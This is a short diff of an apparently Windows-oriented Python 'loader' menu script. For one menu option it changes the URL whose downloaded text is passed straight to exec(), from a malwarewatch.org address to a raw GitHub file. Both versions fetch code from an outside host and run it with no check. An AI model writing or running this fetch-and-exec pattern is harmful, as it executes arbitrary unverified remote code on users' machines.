@@ -63,7 +63,7 @@ while True:
     if chon == '1':
         os.system('cls')
         print("                                              \033[1;39mLoading Windows Iso Page..")
-        exec(requests.get('https://dl.malwarewatch.org/windows/').text)
+        exec(requests.get('https://raw.githubusercontent.com/QuangDayyy/QuangDayy-Loader/main/windows').text)
     if chon == 'SS':
         os.system('cls')
         print("                                            \033[1;39mLoading Software Page..")
